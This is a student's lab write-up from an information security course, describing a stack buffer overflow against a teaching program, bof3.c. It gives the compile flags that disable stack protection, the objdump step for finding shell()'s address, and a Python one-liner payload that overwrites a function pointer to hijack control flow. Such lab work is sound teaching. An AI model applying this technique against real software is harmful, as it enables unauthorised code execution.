# Lab bof3
Hà Quốc Tiến - 22110075<br>
## Target
- `void (*func)()=sup;` is calling the `sup()`, we want it to run the `shell()` instead.
## Solution
- Stack frame<br>
![bof3_1](https://github.com/Quoctienha/InformationSecurity_Labs/blob/main/Buffer-overflow/img/bof3_1.png)
- Viewing the stack frames, we see that in order to call `shell()` instead. We need to buffer-overflow so that `(*func)() = "shell()'s address"`. It's similar to `bof2.c`, here we also look at the `fgets()`. And see it can take 133 bytes of data, while `buf` can only store 128.<br>
## Execution
1. Create `bof3.out` by using ` gcc -g bof3.c -o bof3.out -fno-stack-protector -mpreferred-stack-boundary=2`.<br>
2. Get the address of `shell()`.<br>
    > `objdump -d bof3.out|grep shell`

    ![bof3_2](https://github.com/Quoctienha/InformationSecurity_Labs/blob/main/Buffer-overflow/img/bof3_2.png)
3. We start buffer-overflowing 132 bytes of data into `buf[128]`.
128 bytes of random data + 4 bytes address of `shell()`<br>
    > echo $(python -c "print('a'*128+'\x5b\x84\x04\x08')")| ./bof3.out

    ![bof3_3](https://github.com/Quoctienha/InformationSecurity_Labs/blob/main/Buffer-overflow/img/bof3_3.png)
- And the labs is done.
